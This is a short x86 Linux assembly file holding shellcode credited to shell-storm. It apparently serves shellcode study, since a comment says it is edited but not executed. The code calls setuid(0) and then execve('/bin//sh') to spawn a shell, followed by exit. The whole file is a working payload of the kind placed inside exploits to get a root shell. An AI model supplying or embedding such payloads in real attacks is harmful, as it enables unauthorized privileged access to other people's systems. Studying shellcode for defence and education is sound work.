; original shellcode from shellstorm:
; http://shell-storm.org/shellcode/files/shellcode-549.php

; Due to security reasons, this code will only be edited but not executed


global _start

section .text

_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x17
	int 0x80			; sys call

	xor eax, eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp

	lea edx, [esp + 0x8]
	push eax
	push ebx

	lea ecx, [esp]

	mov al, 0xb
	int 0x80			; sys call
	
	xor eax, eax
	mov al, 0x1
	int 0x80			; syscall
